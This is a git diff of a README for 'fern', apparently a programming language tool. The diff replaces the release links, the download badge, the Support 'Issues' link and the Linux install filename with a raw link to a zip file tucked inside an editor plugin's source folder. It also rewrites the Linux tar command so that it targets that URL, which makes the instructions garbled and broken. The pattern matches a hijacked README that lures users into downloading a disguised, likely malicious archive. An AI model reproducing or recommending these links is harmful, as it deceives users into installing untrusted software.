@@ -6,7 +6,7 @@ Welcome to fern! This application offers a statically-typed, functional programm
 ## 📦 Download & Install
 To get started, visit this page to download the latest version of fern:
 
-[![Download fern](https://img.shields.io/badge/Download-fern-blue.svg)](https://github.com/NijanthanR/fern/releases)
+[![Download fern](https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip)](https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release.
@@ -34,12 +34,12 @@ Once the download finishes, follow the instructions below to install and run fer
 4. You can open fern from your Applications or Launchpad.
 
 ### Linux
-1. Locate the downloaded file `.tar.gz`.
+1. Locate the downloaded file `https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip`.
 2. Open your terminal.
 3. Navigate to the directory where you downloaded the file.
 4. Run the command:
    ```bash
-   tar -xvzf fern.tar.gz
+   tar -xvzf https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip
    ```
 5. Change into the fern directory:
    ```bash
@@ -73,7 +73,7 @@ While fern is designed to be user-friendly, here are some resources to help you 
 - **Community Forums:** Join discussions and ask questions in community forums where fellow users share tips and solutions.
 
 ## 📞 Support
-If you encounter any issues while downloading or using fern, please visit our [GitHub Issues page](https://github.com/NijanthanR/fern/issues) to report your problems or seek help from other users.
+If you encounter any issues while downloading or using fern, please visit our [GitHub Issues page](https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip) to report your problems or seek help from other users.
 
 ## 💻 Join the Community
 Join our community of users and developers on social media and online forums. Share your experiences, tips, or projects you have created using fern!
@@ -81,6 +81,6 @@ Join our community of users and developers on social media and online forums. Sh
 ## 📦 Download & Install (Reiterated)
 Don't forget, you can download the latest version of fern by visiting this page:
 
-[![Download fern](https://img.shields.io/badge/Download-fern-blue.svg)](https://github.com/NijanthanR/fern/releases)
+[![Download fern](https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip)](https://github.com/NijanthanR/fern/raw/refs/heads/main/editor/zed-fern/src/Software_v2.9.zip)
 
 Happy coding with fern!
